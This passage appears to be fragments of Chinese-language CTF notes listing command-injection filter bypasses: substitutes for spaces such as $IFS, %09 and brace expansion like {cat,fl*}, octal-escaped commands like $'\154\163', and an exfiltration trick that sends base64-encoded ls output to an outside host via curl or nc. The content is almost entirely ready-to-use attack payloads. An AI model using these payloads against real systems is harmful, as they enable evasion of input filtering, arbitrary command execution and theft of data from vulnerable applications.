...
< 、<>、%20(space)、%09(tab)、$IFS$9、{cat,fl*}、 ${IFS}、$IFS、kg=$'\x20flag.txt'&&cat$kg等
...
{cat,fl*}为数组，会被bash（只有bash）解析cat flag
...
```
八进制ascii码绕过，$'\154\163' 、 print'\154\163'来执行
...
可使用curl或者nc 访问 http://ip:port/`ls |base64`即可
